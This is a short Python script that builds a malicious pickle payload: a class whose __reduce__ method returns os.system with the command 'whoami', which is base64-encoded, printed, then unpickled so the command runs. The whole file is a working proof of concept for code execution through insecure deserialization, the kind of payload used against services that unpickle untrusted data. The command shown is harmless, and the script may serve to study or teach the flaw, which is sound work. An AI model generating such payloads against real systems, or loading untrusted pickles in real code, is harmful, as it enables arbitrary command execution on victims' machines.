import pickle
import base64

class VeryCoolClass:
    def __reduce__(self):
        import os
        return (
            os.system, ('whoami',)
        )
    
serialised = pickle.dumps(VeryCoolClass())
encoded = base64.b64encode(serialised)

print(encoded)

decoded = base64.b64decode(encoded)
decoded = pickle.loads(decoded)
